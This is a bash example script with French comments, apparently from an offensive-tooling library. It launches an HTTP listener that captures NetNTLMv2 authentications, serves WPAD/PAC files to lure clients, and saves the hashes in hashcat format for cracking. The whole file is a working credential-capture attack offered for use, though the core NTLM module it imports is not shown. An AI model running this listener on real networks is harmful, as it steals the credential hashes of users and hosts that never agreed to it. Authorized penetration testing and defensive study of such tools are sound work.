#!/usr/bin/env bash
#
# examples/http_capture_ntlm.sh - Listener HTTP capture NetNTLMv2
#
# Lance un serveur HTTP minimal sur le port specifie et capture les
# authentifications NTLM des clients qui s'y connectent.
# Sert aussi un WPAD/PAC sur /wpad.dat et /proxy.pac.
#
# Usage :
#   bash examples/http_capture_ntlm.sh [options] <bind_ip>
#
# Options :
#   -p, --port      <port>      Port d'ecoute (defaut : 80, necessite root)
#   -c, --challenge <hex8B>     Challenge NTLM fixe (defaut : 1122334455667788)
#   -o, --output    <fichier>   Fichier de sortie hashcat
#
# Exemples :
#   sudo bash examples/http_capture_ntlm.sh 0.0.0.0
#   bash examples/http_capture_ntlm.sh -p 8080 192.168.1.100
#   bash examples/http_capture_ntlm.sh -p 8080 -o hashes.txt 192.168.1.100
#
# ─────────────────────────────────────────────────────────────────────────────

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../bashket.sh"

bk::import server/http/ntlm

# ── Arguments ─────────────────────────────────────────────────────────────────

PORT=80
CHALLENGE="1122334455667788"
OUTPUT=""

_args=()
while (( $# > 0 )); do
    case "$1" in
        -p|--port)      PORT="$2";      shift 2 ;;
        -c|--challenge) CHALLENGE="$2"; shift 2 ;;
        -o|--output)    OUTPUT="$2";    shift 2 ;;
        *) _args+=("$1"); shift ;;
    esac
done

BIND_IP="${_args[0]:-}"

if [[ -z "${BIND_IP}" ]]; then
    printf 'Usage : %s [options] <bind_ip>\n' "$0" >&2
    printf '\nOptions :\n' >&2
    printf '  -p <port>        Port ecoute (defaut: 80)\n' >&2
    printf '  -c <challenge>   Challenge hex 8 octets\n' >&2
    printf '  -o <fichier>     Sortie hashcat\n' >&2
    exit 1
fi

# ── Callback ──────────────────────────────────────────────────────────────────

_on_capture() {
    local user="$1" domain="$2" hash="$3"
    [[ -n "${OUTPUT}" ]] && printf '%s\n' "${hash}" >> "${OUTPUT}"
}

# ── Lancement ─────────────────────────────────────────────────────────────────

printf '[*] Demarrage listener HTTP sur %s:%s\n' "${BIND_IP}" "${PORT}"
printf '[*] Challenge : %s\n' "${CHALLENGE}"
printf '[*] WPAD disponible sur http://%s:%s/wpad.dat\n' "${BIND_IP}" "${PORT}"
[[ -n "${OUTPUT}" ]] && printf '[*] Sortie hashcat : %s\n' "${OUTPUT}"
printf '[*] Ctrl+C pour arreter\n\n'

if ! http::server::start "${BIND_IP}" "${PORT}" "${CHALLENGE}" "_on_capture"; then
    printf '[!] Echec demarrage - port %s accessible ?\n' "${PORT}" >&2
    exit 1
fi

trap 'http::server::stop; printf "\n[*] Arrete.\n"; exit 0' INT TERM

while true; do
    sleep 5
    if [[ -n "${_HTTP_SRV_CAPTURE_LOG:-}" && -s "${_HTTP_SRV_CAPTURE_LOG}" ]]; then
        cat "${_HTTP_SRV_CAPTURE_LOG}"
        > "${_HTTP_SRV_CAPTURE_LOG}"
    fi
done
